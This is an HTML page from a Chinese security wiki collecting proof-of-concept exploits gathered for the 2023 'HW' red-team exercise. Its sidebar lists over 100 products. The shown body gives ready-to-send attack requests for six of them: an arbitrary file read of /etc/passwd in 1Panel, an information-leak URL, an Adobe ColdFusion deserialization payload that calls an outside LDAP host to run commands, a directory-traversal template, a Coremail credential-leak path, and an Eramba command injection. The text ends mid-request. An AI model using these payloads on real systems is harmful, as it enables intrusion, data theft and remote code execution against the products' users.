<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>一、2023HW漏洞POC/EXP、情报汇总知识库 | 网安攻防知识库WIKI</title>
    <meta name="generator" content="VuePress 1.9.10">
    <link rel="icon" href="/logo.jpg">
    <meta name="description" content="我的个人网站">
    
    <link rel="preload" href="/assets/css/0.styles.9f84806b.css" as="style"><link rel="preload" href="/assets/js/app.7b029d36.js" as="script"><link rel="preload" href="/assets/js/2.6bfae921.js" as="script"><link rel="preload" href="/assets/js/1.4a50f8bd.js" as="script"><link rel="preload" href="/assets/js/22.0e4ee2ee.js" as="script"><link rel="prefetch" href="/assets/js/10.5c32a58d.js"><link rel="prefetch" href="/assets/js/11.72ae73cf.js"><link rel="prefetch" href="/assets/js/12.16ac6487.js"><link rel="prefetch" href="/assets/js/13.5eccdd1e.js"><link rel="prefetch" href="/assets/js/14.3eb9dfa2.js"><link rel="prefetch" href="/assets/js/15.df39777f.js"><link rel="prefetch" href="/assets/js/16.fcff4e7b.js"><link rel="prefetch" href="/assets/js/17.13f9f737.js"><link rel="prefetch" href="/assets/js/18.6d3b94c1.js"><link rel="prefetch" href="/assets/js/19.fd36e329.js"><link rel="prefetch" href="/assets/js/20.ac1cf63f.js"><link rel="prefetch" href="/assets/js/21.e6ea6789.js"><link rel="prefetch" href="/assets/js/3.fb24add6.js"><link rel="prefetch" href="/assets/js/4.84e1e480.js"><link rel="prefetch" href="/assets/js/5.d1364975.js"><link rel="prefetch" href="/assets/js/6.95c348a6.js"><link rel="prefetch" href="/assets/js/7.c5b5bad4.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.5e19b665.js">
    <link rel="stylesheet" href="/assets/css/0.styles.9f84806b.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" aria-current="page" class="home-link router-link-exact-active router-link-active"><!----> <span class="site-name">网安攻防知识库WIKI</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/accumulate/" class="nav-link">
  前端基础
</a></div><div class="nav-item"><a href="/algorithm/" class="nav-link">
  算法题库
</a></div><div class="nav-item"><a href="https://baidu.com" target="_blank" rel="noopener noreferrer" class="nav-link external">
  微博
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/accumulate/" class="nav-link">
  前端基础
</a></div><div class="nav-item"><a href="/algorithm/" class="nav-link">
  算法题库
</a></div><div class="nav-item"><a href="https://baidu.com" target="_blank" rel="noopener noreferrer" class="nav-link external">
  微博
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>一、2023HW漏洞POC/EXP、情报汇总知识库</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/#_1-1panel后台存在任意文件读取漏洞" class="sidebar-link">1.1Panel后台存在任意文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_2-360-新天擎终端安全管理系统信息泄露漏洞" class="sidebar-link">2.360 新天擎终端安全管理系统信息泄露漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_3-adobe-coldfusion-反序列化漏洞cve-2023-29300" class="sidebar-link">3.Adobe ColdFusion 反序列化漏洞CVE-2023-29300</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_4-coding平台idna目录存在目录遍历漏洞" class="sidebar-link">4.CODING平台idna目录存在目录遍历漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_5-coremail-邮件系统未授权访问获取管理员账密" class="sidebar-link">5.Coremail 邮件系统未授权访问获取管理员账密</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_6-eramba任意代码执行漏洞" class="sidebar-link">6.Eramba任意代码执行漏洞</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/#" class="sidebar-link"></a></li></ul></li><li><a href="/#_7-gitlab路径遍历读取任意文件漏洞" class="sidebar-link">7.gitlab路径遍历读取任意文件漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_8-hikvision-视频编码设备接入网关-showfile-php-任意文件下载漏洞" class="sidebar-link">8.HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_9-hikvision-综合安防管理平台-env-信息泄漏漏洞" class="sidebar-link">9.HiKVISION 综合安防管理平台 env 信息泄漏漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_10-hytec-inter-hwl-2511-ss-popen-cgi命令注入漏洞" class="sidebar-link">10.Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_10-jeecg-boot-freemarker-模版注入漏洞" class="sidebar-link">10.Jeecg-Boot Freemarker 模版注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_11-kubepi-jwtsigkey-登陆绕过漏洞-cve-2023-22463" class="sidebar-link">11.KubePi JwtSigKey 登陆绕过漏洞（CVE-2023-22463）</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_12-kuboard默认口令" class="sidebar-link">12.Kuboard默认口令</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_13livebos-showimage-do文件imgname参数读取漏洞" class="sidebar-link">13LiveBos ShowImage.do文件imgName参数读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_13-milesight-vpn-server-js-任意文件读取漏洞" class="sidebar-link">13.Milesight VPN server.js 任意文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_14-nacos-sync" class="sidebar-link">14.Nacos-Sync</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_15-nginx配置错误导致的路径穿越风险" class="sidebar-link">15.nginx配置错误导致的路径穿越风险</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_16-officeweb365-远程代码执行漏洞" class="sidebar-link">16.OfficeWeb365 远程代码执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_17-openfire身份认证绕过漏洞" class="sidebar-link">17.Openfire身份认证绕过漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_18-panabit-ixcache网关rce漏洞cve-2023-38646" class="sidebar-link">18.Panabit iXCache网关RCE漏洞CVE-2023-38646</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_19-panel-loadfile-后台文件读取漏洞" class="sidebar-link">19.Panel loadfile 后台文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_20-pigcms-action-flashupload-任意文件上传漏洞" class="sidebar-link">20.PigCMS action_flashUpload 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_21-qax-vpn存在x遍历及任意账号密码修改漏洞" class="sidebar-link">21.QAX-Vpn存在x遍历及任意账号密码修改漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_22-smart-s85f-任意文件读取" class="sidebar-link">22.Smart S85F 任意文件读取</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_23-wps-rce" class="sidebar-link">23.WPS RCE</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_24-yakit任意文件读取" class="sidebar-link">24.yakit任意文件读取</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_25-安恒明御安全网关rce" class="sidebar-link">25.安恒明御安全网关rce</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_26-安恒明御运维审计与风险控制系统堡垒机任意用户注册" class="sidebar-link">26.安恒明御运维审计与风险控制系统堡垒机任意用户注册</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_27-百卓-smart-s85f-后台文件上传漏洞" class="sidebar-link">27.百卓 Smart S85F 后台文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_28-百卓smart-s45f命令执行" class="sidebar-link">28.百卓Smart S45F命令执行</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_29-禅道-16-5-router-class-php-sql注入漏洞" class="sidebar-link">29.禅道 16.5 router.class.php SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_30-禅道18-0-18-3-backstage命令注入" class="sidebar-link">30.禅道18.0~18.3 backstage命令注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_31-辰信景云终端安全管理系统-login-sql注入漏洞" class="sidebar-link">31.辰信景云终端安全管理系统 login SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_32-大华车载系统任意文件上传漏洞poc" class="sidebar-link">32.大华车载系统任意文件上传漏洞POC</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_33-大华智慧园区任意密码读取攻击" class="sidebar-link">33.大华智慧园区任意密码读取攻击</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_34-大华智慧园区综合管理平台-searchjson-sql注入漏洞" class="sidebar-link">34.大华智慧园区综合管理平台 searchJson SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_35-大华智慧园区综合管理平台-文件上传漏洞" class="sidebar-link">35.大华智慧园区综合管理平台 文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_36-帆软channel序列化" class="sidebar-link">36.帆软channel序列化</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_37-泛微-e-cology-某版本-sql注入漏洞-poc" class="sidebar-link">37.泛微 E-Cology 某版本 SQL注入漏洞 POC</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_38-泛微-hrmcareerapplyperview-sql注入漏洞" class="sidebar-link">38.泛微 HrmCareerApplyPerView SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_39-泛微-showdocsimagesql注入漏洞" class="sidebar-link">39.泛微 ShowDocsImagesql注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_40-泛微-weaver-e-office9-前台文件包含" class="sidebar-link">40.泛微 Weaver E-Office9 前台文件包含</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_41-泛微9存在sql注入" class="sidebar-link">41.泛微9存在sql注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_42-泛微ecology-oa-前台任意sql语句执行" class="sidebar-link">42.泛微Ecology OA 前台任意SQL语句执行</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_43-泛微ecology未授权" class="sidebar-link">43.泛微Ecology未授权</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_44-泛微e-office9文件上传漏洞" class="sidebar-link">44. 泛微E-Office9文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_45-泛微oa代码执行" class="sidebar-link">45.泛微oa代码执行</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_46-飞企互联-fe-业务协作平台-magepath-参数文件读取漏洞" class="sidebar-link">46.飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_47-广联达-linkworks-getimdictionarysql-注入漏洞" class="sidebar-link">47.广联达 Linkworks GetIMDictionarySQL 注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_48-广联达oa-sql注入漏洞" class="sidebar-link">48.广联达oa sql注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_49-广联达oa-后台文件上传漏洞" class="sidebar-link">49.广联达oa 后台文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_50-海康卫视前台上传" class="sidebar-link">50.海康卫视前台上传</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_51-汉得srm-tomcat-jsp-登录绕过漏洞" class="sidebar-link">51.汉得SRM tomcat.jsp 登录绕过漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_52-红帆-oa-注入" class="sidebar-link">52.红帆 oa 注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_53-宏景-hcm-codesettree-sql-注入漏洞" class="sidebar-link">53.宏景 HCM codesettree SQL 注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_54-宏景oa文件上传" class="sidebar-link">54.宏景OA文件上传</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_55-华天动力oa-sql注入" class="sidebar-link">55.华天动力oa SQL注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_56-金蝶云星空-commonfileserver-任意文件读取漏洞" class="sidebar-link">56.金蝶云星空 CommonFileserver 任意文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_57-金和oa-c6-getsqldata-aspx-sql注入漏洞-poc" class="sidebar-link">57.金和OA C6-GetSqlData.aspx SQL注入漏洞 POC</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_58-金和oa-未授权" class="sidebar-link">58.金和OA 未授权</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_59-金盘-微信管理平台-getsysteminfo-未授权访问漏洞" class="sidebar-link">59.金盘 微信管理平台 getsysteminfo 未授权访问漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_60-金山edr代码执行漏洞" class="sidebar-link">60.金山EDR代码执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_61-金山终端安全系统v9任意文件上传漏洞" class="sidebar-link">61.金山终端安全系统V9任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_62-蓝凌ekp系统存在未授权访问漏洞" class="sidebar-link">62.蓝凌EKP系统存在未授权访问漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_63-蓝凌-oa-rce" class="sidebar-link">63.蓝凌-OA-RCE</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_64-绿盟-nf-下一代防火墙-任意文件上传漏洞" class="sidebar-link">64.绿盟 NF 下一代防火墙 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_65-绿盟-sas堡垒机-exec-远程命令执行漏洞" class="sidebar-link">65.绿盟 SAS堡垒机 Exec 远程命令执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_66-绿盟-sas堡垒机-local-user-php-任意用户登录漏洞" class="sidebar-link">66.绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_67-绿盟sas安全审计系统任意文件读取漏洞" class="sidebar-link">67.绿盟sas安全审计系统任意文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_68-明源erp存在sql时间盲注" class="sidebar-link">68.明源ERP存在SQL时间盲注</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_69-明源云-erp-apiupdate-ashx-文件上传漏洞" class="sidebar-link">69.明源云 ERP ApiUpdate.ashx 文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_70-企业微信-私有化版本-敏感信息泄露漏洞" class="sidebar-link">70.企业微信（私有化版本）敏感信息泄露漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_71-启明星辰-4a-统一安全管控平台-getmater-信息泄漏" class="sidebar-link">71.启明星辰-4A 统一安全管控平台 getMater 信息泄漏</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_72-契约锁电子签章系统-rce" class="sidebar-link">72.契约锁电子签章系统 RCE</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_73-任我行-crm-smsdatalist-sql注入漏洞" class="sidebar-link">73.任我行 CRM SmsDataList SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_74-锐捷-nbr-路由器-fileupload-php-任意文件上传漏洞" class="sidebar-link">74.锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_75-锐捷交换机-web-管理系统-excu-shell-信息泄露" class="sidebar-link">75.锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_75-赛思succezbi前台任意文件上传" class="sidebar-link">75.赛思SuccezBI前台任意文件上传</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_76-深信服sg上网优化管理系统catjs-php任意文件读取漏洞" class="sidebar-link">76.深信服SG上网优化管理系统catjs.php任意文件读取漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_77-深信服报表" class="sidebar-link">77.深信服报表</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_78-深信服数据中心管理系统-xml-实体注入漏洞" class="sidebar-link">78.深信服数据中心管理系统 XML 实体注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_79-深信服应用交付系统命令执行漏洞" class="sidebar-link">79.深信服应用交付系统命令执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_80-天钥网关前台sql注入" class="sidebar-link">80.天钥网关前台SQL注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_81-通达oa-sql注入" class="sidebar-link">81.通达oa_sql注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_82-通达oacve-2023-4166" class="sidebar-link">82.通达oaCVE-2023-4166</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_83-网神-secgate-3600-防火墙-obj-app-upfile-任意文件上传漏洞" class="sidebar-link">83.网神 SecGate 3600 防火墙 objappupfile 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#漏洞复现" class="sidebar-link">漏洞复现</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_84-网神-secssl-3600安全接入网关系统-任意密码修改漏洞" class="sidebar-link">84.网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_85-网御-acm-上网行为管理系统bottomframe-cgi-sql-注入漏洞" class="sidebar-link">85.网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_86-新开普智慧校园系统代码执行漏洞" class="sidebar-link">86.新开普智慧校园系统代码执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_87-亿赛通-uploadfilefromclientserviceforclient-任意文件上传漏洞" class="sidebar-link">87.亿赛通 /UploadFileFromClientServiceForClient 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_88-亿赛通电子文档安全管理系统远程命令执行漏洞" class="sidebar-link">88.亿赛通电子文档安全管理系统远程命令执行漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_89-用友-nc-cloud-jsinvoke-任意文件上传漏洞" class="sidebar-link">89.用友 NC Cloud jsinvoke 任意文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_90-用友grp-u8存在信息泄露" class="sidebar-link">90.用友GRP-U8存在信息泄露</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_91-用友畅捷通-t注入" class="sidebar-link">91.用友畅捷通 T注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_92-用友时空-ksoa-servletimagefield-文件-skeyvalue-参数sql-注入" class="sidebar-link">92.用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_93-用友时空-ksoataskrequestservlet-sql注入漏洞" class="sidebar-link">93.用友时空 KSOATaskRequestServlet sql注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_94-用友时空ksoa-paybill-sql注入漏洞" class="sidebar-link">94.用友时空KSOA PayBill SQL注入漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_95-用友文件服务器认证绕过" class="sidebar-link">95.用友文件服务器认证绕过</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_96-用友移动管理系统-uploadapk-d" class="sidebar-link">96.用友移动管理系统 uploadApk.d</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_97-用有畅捷通t-getstorewarehousebystore-rce漏洞" class="sidebar-link">97.用有畅捷通T+GetStoreWarehouseByStore RCE漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_98-用友nc-cloudrce" class="sidebar-link">98.用友nc-cloudRCE</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_99-远秋医学技能考试系统sql注入" class="sidebar-link">99.远秋医学技能考试系统SQL注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_100-致远oa-rce" class="sidebar-link">100.致远oa rce</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_101-致远oa-任意文件上传" class="sidebar-link">101.致远oa 任意文件上传</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_102-致远oa-v8-1sp2文件上传漏洞" class="sidebar-link">102.致远OA_V8.1SP2文件上传漏洞</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_103-致远oa任意管理员登录" class="sidebar-link">103.致远OA任意管理员登录</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_104-中远麒麟堡垒机sql注入" class="sidebar-link">104.中远麒麟堡垒机SQL注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_105-中远麒麟堡垒机tokens-sql" class="sidebar-link">105.中远麒麟堡垒机tokens SQL</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/#_106-metabase远程代码执行漏洞" class="sidebar-link">106.Metabase远程代码执行漏洞</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="一、2023hw漏洞poc-exp、情报汇总知识库"><a href="#一、2023hw漏洞poc-exp、情报汇总知识库" class="header-anchor">#</a> 一、2023HW漏洞POC/EXP、情报汇总知识库</h1> <h2 id="_1-1panel后台存在任意文件读取漏洞"><a href="#_1-1panel后台存在任意文件读取漏洞" class="header-anchor">#</a> 1.1Panel后台存在任意文件读取漏洞</h2> <p><strong>漏洞描述</strong></p> <p>1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /api/v1/file/loadfile {&quot;paht&quot;:&quot;/etc/passwd&quot;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_2-360-新天擎终端安全管理系统信息泄露漏洞"><a href="#_2-360-新天擎终端安全管理系统信息泄露漏洞" class="header-anchor">#</a> 2.360 新天擎终端安全管理系统信息泄露漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://ip:port/runtime/admin_log_conf.cache
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_3-adobe-coldfusion-反序列化漏洞cve-2023-29300"><a href="#_3-adobe-coldfusion-反序列化漏洞cve-2023-29300" class="header-anchor">#</a> 3.Adobe ColdFusion 反序列化漏洞CVE-2023-29300</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1
Host: 1.2.3.4:1234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
cmd: id

argumentCollection=
&lt;wddxPacket version='1.0'&gt;
    &lt;header/&gt;
    &lt;data&gt;
        &lt;struct type='xcom.sun.rowset.JdbcRowSetImplx'&gt;
            &lt;var name='dataSourceName'&gt;
                &lt;string&gt;ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho&lt;/string&gt;
            &lt;/var&gt;
            &lt;var name='autoCommit'&gt;
                &lt;boolean value='true'/&gt;
            &lt;/var&gt;
        &lt;/struct&gt;
    &lt;/data&gt;
&lt;/wddxPacket&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h2 id="_4-coding平台idna目录存在目录遍历漏洞"><a href="#_4-coding平台idna目录存在目录遍历漏洞" class="header-anchor">#</a> 4.CODING平台idna目录存在目录遍历漏洞</h2> <p>CODing.net是一个面向开发者的云端开发平台，提供 Git/SVN 代码托管、任务管理，在idna存在目录泄露漏洞，攻击者可获取目录文件信息。</p> <p>检索条件: title=&quot;一站式软件研发管理平台&quot;</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /ci/pypi/simple/idna/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (code.eq(&quot;200&quot;) &amp;&amp; body.contains(&quot;Index of&quot;))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="_5-coremail-邮件系统未授权访问获取管理员账密"><a href="#_5-coremail-邮件系统未授权访问获取管理员账密" class="header-anchor">#</a> 5.Coremail 邮件系统未授权访问获取管理员账密</h2> <p>POC：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/coremail/common/assets/:/:/:/:/:/:/s?

biz=Mzl3MTk4NTcyNw==&amp;mid=2247485877&amp;idx=1&amp;sn=7e5f77db320ccf9013c0b7aa7262

6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b

f6adaed61&amp;scene=2
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_6-eramba任意代码执行漏洞"><a href="#_6-eramba任意代码执行漏洞" class="header-anchor">#</a> 6.Eramba任意代码执行漏洞</h2> <p><strong>0x01 漏洞详情</strong></p> <p><strong>CVE-2023-36255</strong></p> <p>**漏洞类型：**远程代码执行</p> <p>**影响：**接管服务器</p> <p>**简述：**Eramba存在远程代码执行漏洞，允许经过身份验证的用户执行任意代码。</p> <h3 id=""><a href="#" class="header-anchor">#</a></h3> <p><strong>0x02 影响版本</strong></p> <ul><li>Enterprise and Community edition &lt;= 3.19.1</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1
Host: [redacted]
Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://[redacted]/settings
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
